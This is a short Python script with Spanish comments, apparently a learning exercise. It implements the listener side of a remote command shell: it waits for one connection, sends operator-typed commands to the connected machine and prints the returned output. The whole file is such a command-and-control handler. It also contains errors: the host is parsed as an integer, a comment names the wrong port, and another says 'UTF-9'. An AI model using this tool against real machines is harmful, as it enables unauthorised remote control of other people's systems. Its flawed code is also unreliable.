import socket

# def setup_server():
host = int(input())
port = int(input())
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Reuse the socket address to avoid "address in use" errors
    
s.bind((host, port)) # Liga el socket al puerto 6969 y permite todas las IPs. Binds the 
s.listen() # Habilita que puedan entrar conexiones
print(f"Server listening on {host}:{port}")
conn, addr = s.accept() # Acepta conexiones

# print("Connection: " + conn)
print("Connection received from: " + addr[0]) # Imprime el primer valor del addr (la IP).

while True:  
    command = input("CMD> ") # Comando a ejecutar, con un prompt.

    if command == "exit":
        conn.send("exit".encode('UTF-8'))
        conn.close()
        break

    conn.send(command.encode('UTF-8')) # Enviar por el socket un comando. Lo codificamos de UTF-8 a bites.
    
    print(conn.recv(4096).decode('UTF-8')) # Recibimos el output del cliente y lo descodificamos a UTF-9 (viene en bites).

    